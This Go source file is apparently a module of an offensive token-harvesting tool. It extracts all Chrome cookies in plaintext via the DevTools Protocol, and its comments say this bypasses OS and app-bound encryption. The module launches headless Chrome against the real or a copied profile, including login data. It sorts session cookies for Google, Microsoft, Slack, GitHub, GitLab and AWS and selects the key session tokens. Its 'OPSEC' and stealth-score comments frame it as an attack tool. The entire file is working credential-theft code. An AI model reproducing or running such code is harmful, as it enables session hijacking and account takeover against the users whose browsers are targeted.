// Universal Chrome cookie extraction via CDP (Chrome DevTools Protocol).
//
// Uses Network.getAllCookies to extract ALL browser cookies in plaintext —
// bypasses DPAPI (Windows), Keychain (macOS), peanuts (Linux), and v20
// app-bound encryption entirely.
//
// Flow:
//  1. Locate Chrome binary + user data directory
//  2. Check if Chrome is already running with a debug port (DevToolsActivePort)
//  3. If not, launch headless Chrome — try real profile first, fall back to
//     temp copy if the profile is locked by a running Chrome instance
//  4. Connect CDP, call Network.enable + Network.getAllCookies
//  5. Group cookies by service (Google, Microsoft, Slack, etc.)
//  6. Return one CollectedToken per service with cookies found
//
// OPSEC:
//   - Stealth score 4: launches a headless Chrome process (visible in ps)
//   - No network requests — cookies are read locally via CDP
//   - Temp profile (if used) is cleaned up immediately after extraction
//   - Works on ALL platforms: macOS, Windows, Linux
package chrome

import (
	"encoding/json"
	"fmt"
	"net"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"sort"
	"strconv"
	"strings"
	"time"

	"github.com/ninken/ninloader-go/internal/cdp"
	"github.com/ninken/ninloader-go/internal/collector"
	"github.com/ninken/ninloader-go/internal/platform"
	"github.com/ninken/ninloader-go/internal/registry"
	"github.com/ninken/ninloader-go/internal/types"
)

// ── Service host patterns ──────────────────────────────────────
// Each key is a logical service name; value is a list of host substrings.
// A cookie whose domain contains ANY substring is assigned to that service.

var serviceHostPatterns = map[string][]string{
	"google": {
		".google.com",
		"accounts.google.com",
		".googleapis.com",
		".youtube.com",
		".googlevideo.com",
	},
	"microsoft": {
		".microsoft.com",
		".microsoftonline.com",
		".office.com",
		".office365.com",
		".live.com",
		".sharepoint.com",
		".teams.microsoft.com",
	},
	"slack": {
		".slack.com",
	},
	"github": {
		".github.com",
		"github.com",
	},
	"gitlab": {
		".gitlab.com",
		"gitlab.com",
	},
	"aws": {
		".aws.amazon.com",
		".amazonaws.com",
		"console.aws.amazon.com",
		".signin.aws.amazon.com",
	},
}

// Files to copy for a minimal temp profile (enough for Chrome to start
// and load cookies from the real profile's cookie store).
var profileFiles = []string{
	"Local State",
	filepath.Join("Default", "Cookies"),
	filepath.Join("Default", "Cookies-journal"),
	filepath.Join("Default", "Cookies-wal"),
	filepath.Join("Default", "Network", "Cookies"),
	filepath.Join("Default", "Network", "Cookies-journal"),
	filepath.Join("Default", "Network", "Cookies-wal"),
	filepath.Join("Default", "Preferences"),
	filepath.Join("Default", "Secure Preferences"),
	filepath.Join("Default", "Login Data"),
	filepath.Join("Default", "Login Data-journal"),
	filepath.Join("Default", "Web Data"),
	filepath.Join("Default", "Web Data-journal"),
}

func init() {
	registry.Register("chrome", "cdp_cookies", func() collector.Collector {
		return &CDPCookieCollector{
			BaseCollector: collector.BaseCollector{Svc: "chrome", Src: "cdp_cookies"},
		}
	})
}

// CDPCookieCollector is the universal Chrome cookie extractor via CDP —
// works on ALL platforms. Bypasses DPAPI, Keychain, peanuts, and v20
// app-bound encryption by asking Chrome itself to return cookies in
// plaintext over CDP.
type CDPCookieCollector struct {
	collector.BaseCollector
}

func (c *CDPCookieCollector) Service() string          { return c.Svc }
func (c *CDPCookieCollector) Source() string            { return c.Src }
func (c *CDPCookieCollector) StealthScore() int         { return 4 }
func (c *CDPCookieCollector) Platforms() []string       { return nil } // all platforms
func (c *CDPCookieCollector) IsPlatformSupported() bool { return true }

// ── Chrome binary discovery ──────────────────────────────────────

func findChrome() string {
	plat := runtime.GOOS
	var candidates []string

	switch plat {
	case "darwin":
		home, _ := os.UserHomeDir()
		candidates = []string{
			"/Applications/Google Chrome.app/Contents/MacOS/Google Chrome",
			"/Applications/Chromium.app/Contents/MacOS/Chromium",
		}
		if home != "" {
			candidates = append(candidates,
				filepath.Join(home, "Applications", "Google Chrome.app", "Contents", "MacOS", "Google Chrome"),
			)
		}

	case "windows":
		for _, envVar := range []string{"PROGRAMFILES", "PROGRAMFILES(X86)", "LOCALAPPDATA"} {
			base := os.Getenv(envVar)
			if base != "" {
				candidates = append(candidates,
					filepath.Join(base, "Google", "Chrome", "Application", "chrome.exe"),
				)
			}
		}

	default: // linux
		candidates = []string{
			"/usr/bin/google-chrome",
			"/usr/bin/google-chrome-stable",
			"/usr/bin/chromium-browser",
			"/usr/bin/chromium",
			"/snap/bin/chromium",
		}
	}

	for _, path := range candidates {
		if info, err := os.Stat(path); err == nil && !info.IsDir() {
			return path
		}
	}

	// Fallback: try PATH
	for _, name := range []string{"google-chrome", "google-chrome-stable", "chromium", "chrome"} {
		if path, err := exec.LookPath(name); err == nil {
			return path
		}
	}

	return ""
}

// ── DevToolsActivePort reader ──────────────────────────────────

// readDevToolsPort reads the DevToolsActivePort file from a Chrome user data dir.
// Returns (port, wsPath, true) if the file exists and the port is reachable.
func readDevToolsPort(userDataDir string) (int, string, bool) {
	portFile := filepath.Join(userDataDir, "DevToolsActivePort")
	raw, err := os.ReadFile(portFile)
	if err != nil {
		return 0, "", false
	}

	content := strings.TrimSpace(string(raw))
	lines := strings.Split(content, "\n")
	if len(lines) < 2 {
		return 0, "", false
	}

	port, err := strconv.Atoi(strings.TrimSpace(lines[0]))
	if err != nil {
		return 0, "", false
	}
	wsPath := strings.TrimSpace(lines[1])

	// Check if the port is actually reachable.
	conn, err := net.DialTimeout("tcp", fmt.Sprintf("127.0.0.1:%d", port), 2*time.Second)
	if err != nil {
		return 0, "", false
	}
	conn.Close()

	return port, wsPath, true
}

// ── Temp profile copy ──────────────────────────────────────────

// copyMinimalProfile copies minimal Chrome profile files to a temp directory.
// Copies just enough for Chrome to start and load the cookie store.
func copyMinimalProfile(userDataDir string) string {
	if info, err := os.Stat(userDataDir); err != nil || !info.IsDir() {
		return ""
	}

	tempDir, err := os.MkdirTemp("", "ninloader_cdp_cookies_")
	if err != nil {
		return ""
	}

	for _, relPath := range profileFiles {
		src := filepath.Join(userDataDir, relPath)
		dst := filepath.Join(tempDir, relPath)
		if _, err := os.Stat(src); err != nil {
			continue
		}
		if err := os.MkdirAll(filepath.Dir(dst), 0755); err != nil {
			continue
		}
		data, err := os.ReadFile(src)
		if err != nil {
			continue
		}
		_ = os.WriteFile(dst, data, 0600)
	}

	// Chrome needs a First Run sentinel to skip setup wizard.
	_ = os.WriteFile(filepath.Join(tempDir, "First Run"), []byte{}, 0600)

	// Patch Preferences to avoid "Restore pages" dialog.
	prefsPath := filepath.Join(tempDir, "Default", "Preferences")
	if raw, err := os.ReadFile(prefsPath); err == nil {
		var prefs map[string]any
		if json.Unmarshal(raw, &prefs) == nil {
			if prefs["profile"] == nil {
				prefs["profile"] = map[string]any{}
			}
			if profileMap, ok := prefs["profile"].(map[string]any); ok {
				profileMap["exit_type"] = "Normal"
				profileMap["exited_cleanly"] = true
			}
			if prefs["session"] == nil {
				prefs["session"] = map[string]any{}
			}
			if sessionMap, ok := prefs["session"].(map[string]any); ok {
				sessionMap["restore_on_startup"] = 4
			}
			if patched, err := json.Marshal(prefs); err == nil {
				_ = os.WriteFile(prefsPath, patched, 0600)
			}
		}
	}

	return tempDir
}

// ── Cookie grouping ──────────────────────────────────────────

// matchService returns the service name if the domain matches a known pattern.
func matchService(domain string) string {
	domainLower := strings.ToLower(domain)
	for svc, patterns := range serviceHostPatterns {
		for _, pattern := range patterns {
			if strings.Contains(domainLower, pattern) {
				return svc
			}
		}
	}
	return ""
}

// cdpCookie represents a raw CDP cookie dict.
type cdpCookie struct {
	Name     string  `json:"name"`
	Value    string  `json:"value"`
	Domain   string  `json:"domain"`
	Path     string  `json:"path"`
	Secure   bool    `json:"secure"`
	HTTPOnly bool    `json:"httpOnly"`
	SameSite string  `json:"sameSite"`
	Expires  float64 `json:"expires"`
}

// groupCookiesByService groups raw CDP cookies by service based on host patterns.
func groupCookiesByService(cookies []cdpCookie) map[string][]cdpCookie {
	grouped := make(map[string][]cdpCookie)
	for _, ck := range cookies {
		svc := matchService(ck.Domain)
		if svc != "" {
			grouped[svc] = append(grouped[svc], ck)
		}
	}
	return grouped
}

// ── Primary cookie selection ──────────────────────────────────

// pickPrimaryCookie picks the most important cookie value for a service.
// Used as the access_token field in CollectedToken.
func pickPrimaryCookie(service string, cookies []cdpCookie) string {
	cookieMap := make(map[string]string)
	for _, ck := range cookies {
		cookieMap[ck.Name] = ck.Value
	}

	var priority []string
	switch service {
	case "google":
		priority = []string{"SAPISID", "SID", "__Secure-1PSID", "HSID"}
	case "microsoft":
		priority = []string{"ESTSAUTHPERSISTENT", "ESTSAUTH"}
	case "slack":
		priority = []string{"d"}
	case "github":
		priority = []string{"user_session", "dotcom_user", "_gh_sess"}
	case "gitlab":
		priority = []string{"_gitlab_session", "known_sign_in"}
	case "aws":
		priority = []string{"aws-creds", "aws-userInfo", "JSESSIONID"}
	}

	for _, name := range priority {
		if val, ok := cookieMap[name]; ok && val != "" {
			return val
		}
	}

	// Fallback: return the first non-empty cookie value.
	for _, ck := range cookies {
		if ck.Value != "" {
			return ck.Value
		}
	}

	return ""
}

// ── The Collector ──────────────────────────────────────────────

func (c *CDPCookieCollector) Discover() []*types.DiscoveredToken {
	chromeBin := findChrome()
	chromeDir := platform.ChromeUserDataDir()

	hasProfile := false
	if info, err := os.Stat(chromeDir); err == nil && info.IsDir() {
		cookiesPath := filepath.Join(chromeDir, "Default", "Cookies")
		networkCookiesPath := filepath.Join(chromeDir, "Default", "Network", "Cookies")
		if cdpFileExists(cookiesPath) || cdpFileExists(networkCookiesPath) {
			hasProfile = true
		}
	}

	if chromeBin != "" && hasProfile {
		// Check if there's already a debug port available.
		port, _, portActive := readDevToolsPort(chromeDir)
		portHint := "will launch headless Chrome"
		if portActive {
			portHint = fmt.Sprintf("debug port %d already active", port)
		}

		return []*types.DiscoveredToken{
			{
				Service:      c.Svc,
				Source:       c.Src,
				Path:         chromeDir,
				AccountHint:  "all Chrome profiles",
				StealthScore: c.StealthScore(),
				Details: fmt.Sprintf(
					"CDP Network.getAllCookies — universal decrypt bypass; platform=%s; %s",
					platform.Platform(), portHint,
				),
			},
		}
	}

	// Not available — report what's missing.
	var missing []string
	if chromeBin == "" {
		missing = append(missing, "Chrome binary")
	}
	if !hasProfile {
		missing = append(missing, "Chrome profile with cookies")
	}

	return []*types.DiscoveredToken{
		{
			Service:      c.Svc,
			Source:       c.Src,
			Path:         chromeDir,
			StealthScore: c.StealthScore(),
			Details:      fmt.Sprintf("not available — missing: %s", strings.Join(missing, ", ")),
		},
	}
}

func (c *CDPCookieCollector) Collect() []*types.CollectedToken {
	chromeBin := findChrome()
	if chromeBin == "" {
		c.Warn("Chrome binary not found")
		return nil
	}

	chromeDir := platform.ChromeUserDataDir()
	if info, err := os.Stat(chromeDir); err != nil || !info.IsDir() {
		c.Warn(fmt.Sprintf("Chrome user data dir not found: %s", chromeDir))
		return nil
	}

	// Try to get cookies — attempt strategies in order.
	cookies := c.tryExistingDebugPort(chromeDir)
	if cookies == nil {
		cookies = c.tryLaunchWithRealProfile(chromeBin, chromeDir)
	}
	if cookies == nil {
		cookies = c.tryLaunchWithTempProfile(chromeBin, chromeDir)
	}
	if cookies == nil {
		c.Warn("All CDP cookie extraction strategies failed")
		return nil
	}

	c.Info(fmt.Sprintf("Extracted %d total cookies from Chrome", len(cookies)))

	// Group cookies by service and build CollectedTokens.
	grouped := groupCookiesByService(cookies)

	// Sort service names for deterministic output.
	svcNames := make([]string, 0, len(grouped))
	for svc := range grouped {
		svcNames = append(svcNames, svc)
	}
	sort.Strings(svcNames)

	var results []*types.CollectedToken

	for _, svc := range svcNames {
		svcCookies := grouped[svc]

		// Pick the most important cookie as the primary token.
		primaryValue := pickPrimaryCookie(svc, svcCookies)

		cookieData := make(map[string]any)
		for _, ck := range svcCookies {
			cookieData[ck.Name] = map[string]any{
				"value":    ck.Value,
				"domain":   ck.Domain,
				"path":     ck.Path,
				"secure":   ck.Secure,
				"httpOnly": ck.HTTPOnly,
				"sameSite": ck.SameSite,
				"expires":  ck.Expires,
			}
		}

		tok := types.NewCollectedToken(svc, c.Src, c.StealthScore())
		if primaryValue != "" {
			tok.AccessToken = types.Secure(primaryValue)
		}
		tok.Extra["extraction_method"] = "cdp_network_getAllCookies"
		tok.Extra["cookies"] = cookieData
		tok.Extra["cookie_count"] = len(svcCookies)
		tok.Extra["platform"] = platform.Platform()

		results = append(results, tok)

		// Log cookie names (up to first 10).
		nameSet := make(map[string]struct{})
		for _, ck := range svcCookies {
			nameSet[ck.Name] = struct{}{}
		}
		names := make([]string, 0, len(nameSet))
		for n := range nameSet {
			names = append(names, n)
		}
		sort.Strings(names)
		if len(names) > 10 {
			names = names[:10]
		}
		c.Info(fmt.Sprintf("  %s: %d cookies (%s)", svc, len(svcCookies), strings.Join(names, ", ")))
	}

	return results
}

// ── Strategy 1: Existing debug port ──────────────────────────

func (c *CDPCookieCollector) tryExistingDebugPort(chromeDir string) []cdpCookie {
	port, _, active := readDevToolsPort(chromeDir)
	if !active {
		return nil
	}

	c.Info(fmt.Sprintf("Found existing Chrome debug port: %d", port))

	cookies, err := c.getCookiesViaCDP(port)
	if err != nil {
		c.Warn(fmt.Sprintf("Failed to use existing debug port %d: %v", port, err))
		return nil
	}
	return cookies
}

// ── Strategy 2: Launch with real profile ─────────────────────

func (c *CDPCookieCollector) tryLaunchWithRealProfile(chromeBin, chromeDir string) []cdpCookie {
	c.Info("Attempting headless Chrome with real profile...")

	port, proc, err := c.launchHeadlessChrome(chromeBin, chromeDir)
	if err != nil {
		c.Info(fmt.Sprintf("Real profile launch failed (expected if Chrome is running): %v", err))
		return nil
	}
	defer terminateChrome(proc)

	cookies, err := c.getCookiesViaCDP(port)
	if err != nil {
		c.Info(fmt.Sprintf("Real profile CDP extraction failed: %v", err))
		return nil
	}
	return cookies
}

// ── Strategy 3: Launch with temp profile copy ────────────────

func (c *CDPCookieCollector) tryLaunchWithTempProfile(chromeBin, chromeDir string) []cdpCookie {
	c.Info("Copying minimal profile to temp dir for headless extraction...")

	tempDir := copyMinimalProfile(chromeDir)
	if tempDir == "" {
		c.Warn("Failed to create temp profile copy")
		return nil
	}
	defer os.RemoveAll(tempDir)

	port, proc, err := c.launchHeadlessChrome(chromeBin, tempDir)
	if err != nil {
		c.Warn(fmt.Sprintf("Temp profile extraction failed: %v", err))
		return nil
	}
	defer terminateChrome(proc)

	cookies, err := c.getCookiesViaCDP(port)
	if err != nil {
		c.Warn(fmt.Sprintf("Temp profile CDP extraction failed: %v", err))
		return nil
	}
	return cookies
}

// ── Chrome launch helper ─────────────────────────────────────

// launchHeadlessChrome launches Chrome in headless mode with remote debugging.
// Uses --remote-debugging-port=0 so Chrome picks a free port, then reads the
// assigned port from DevToolsActivePort. Returns (port, process, error).
func (c *CDPCookieCollector) launchHeadlessChrome(chromeBin, userDataDir string) (int, *os.Process, error) {
	args := []string{
		"--headless=new",
		fmt.Sprintf("--user-data-dir=%s", userDataDir),
		"--remote-debugging-port=0",
		"--no-first-run",
		"--no-default-browser-check",
		"--disable-extensions",
		"--disable-background-networking",
		"--disable-sync",
		"--disable-translate",
		"--disable-component-update",
		"--disable-domain-reliability",
		"--disable-client-side-phishing-detection",
		"--disable-features=MediaRouter",
		"--disable-gpu",
		"--no-sandbox",
		"about:blank",
	}

	cmd := exec.Command(chromeBin, args...)
	cmd.Stdout = nil
	cmd.Stderr = nil

	if err := cmd.Start(); err != nil {
		return 0, nil, fmt.Errorf("failed to start Chrome: %w", err)
	}

	proc := cmd.Process

	// Wait for DevToolsActivePort file to appear.
	portFile := filepath.Join(userDataDir, "DevToolsActivePort")
	deadline := time.Now().Add(15 * time.Second)
	var port int

	for time.Now().Before(deadline) {
		// Check if process died.
		var ws os.ProcessState
		_ = ws // unused — we check via cmd
		if cmd.ProcessState != nil {
			terminateChrome(proc)
			return 0, nil, fmt.Errorf("Chrome exited immediately (profile may be locked)")
		}

		raw, err := os.ReadFile(portFile)
		if err == nil {
			content := strings.TrimSpace(string(raw))
			lines := strings.Split(content, "\n")
			if len(lines) > 0 {
				if p, err := strconv.Atoi(strings.TrimSpace(lines[0])); err == nil {
					port = p
					break
				}
			}
		}

		time.Sleep(300 * time.Millisecond)
	}

	if port == 0 {
		terminateChrome(proc)
		return 0, nil, fmt.Errorf("timed out waiting for Chrome DevToolsActivePort")
	}

	c.Info(fmt.Sprintf("Headless Chrome started on debug port %d", port))
	return port, proc, nil
}

// ── CDP cookie extraction ────────────────────────────────────

// getCookiesViaCDP connects to Chrome CDP and calls Network.getAllCookies.
func (c *CDPCookieCollector) getCookiesViaCDP(port int) ([]cdpCookie, error) {
	client := cdp.NewClient(port, 10*time.Second)
	if err := client.Connect(""); err != nil {
		return nil, fmt.Errorf("CDP connect: %w", err)
	}
	defer client.Close()

	if _, err := client.Send("Network.enable", nil); err != nil {
		return nil, fmt.Errorf("Network.enable: %w", err)
	}

	result, err := client.Send("Network.getAllCookies", nil)
	if err != nil {
		return nil, fmt.Errorf("Network.getAllCookies: %w", err)
	}

	// Parse the cookies from the CDP response.
	cookiesRaw, ok := result["cookies"]
	if !ok {
		return nil, fmt.Errorf("no cookies field in CDP response")
	}

	// The result is map[string]any, so cookies is []any.
	cookiesList, ok := cookiesRaw.([]any)
	if !ok {
		return nil, fmt.Errorf("unexpected cookies type in CDP response")
	}

	var cookies []cdpCookie
	for _, item := range cookiesList {
		m, ok := item.(map[string]any)
		if !ok {
			continue
		}
		ck := cdpCookie{
			Name:     cdpStr(m, "name"),
			Value:    cdpStr(m, "value"),
			Domain:   cdpStr(m, "domain"),
			Path:     cdpStr(m, "path"),
			SameSite: cdpStr(m, "sameSite"),
			Secure:   cdpBool(m, "secure"),
			HTTPOnly: cdpBool(m, "httpOnly"),
			Expires:  cdpFloat(m, "expires"),
		}
		cookies = append(cookies, ck)
	}

	return cookies, nil
}

// ── Chrome termination ───────────────────────────────────────

// terminateChrome gracefully terminates a Chrome process.
func terminateChrome(proc *os.Process) {
	if proc == nil {
		return
	}
	// Try graceful termination first (SIGTERM on unix, TerminateProcess on Windows).
	_ = proc.Signal(os.Interrupt)

	// Wait briefly for graceful shutdown.
	done := make(chan struct{})
	go func() {
		_, _ = proc.Wait()
		close(done)
	}()

	select {
	case <-done:
		return
	case <-time.After(5 * time.Second):
		// Force kill.
		_ = proc.Kill()
		select {
		case <-done:
		case <-time.After(3 * time.Second):
		}
	}
}

// ── Convenience methods ──────────────────────────────────────

// GetAllCookies extracts ALL cookies from Chrome. Returns raw CDP cookie list.
// Convenience method for use by other collectors / modules.
func (c *CDPCookieCollector) GetAllCookies() []cdpCookie {
	chromeBin := findChrome()
	if chromeBin == "" {
		return nil
	}

	chromeDir := platform.ChromeUserDataDir()
	if info, err := os.Stat(chromeDir); err != nil || !info.IsDir() {
		return nil
	}

	cookies := c.tryExistingDebugPort(chromeDir)
	if cookies == nil {
		cookies = c.tryLaunchWithRealProfile(chromeBin, chromeDir)
	}
	if cookies == nil {
		cookies = c.tryLaunchWithTempProfile(chromeBin, chromeDir)
	}

	return cookies
}

// GetCookiesForService extracts cookies for a specific service.
// service is one of the keys in serviceHostPatterns
// (google, microsoft, slack, github, gitlab, aws).
func (c *CDPCookieCollector) GetCookiesForService(service string) []cdpCookie {
	allCookies := c.GetAllCookies()
	if allCookies == nil {
		return nil
	}
	grouped := groupCookiesByService(allCookies)
	return grouped[service]
}

// ── Helpers ──────────────────────────────────────────────────

func cdpStr(m map[string]any, key string) string {
	v, _ := m[key].(string)
	return v
}

func cdpBool(m map[string]any, key string) bool {
	v, _ := m[key].(bool)
	return v
}

func cdpFloat(m map[string]any, key string) float64 {
	v, _ := m[key].(float64)
	return v
}

func cdpFileExists(path string) bool {
	info, err := os.Stat(path)
	return err == nil && !info.IsDir()
}
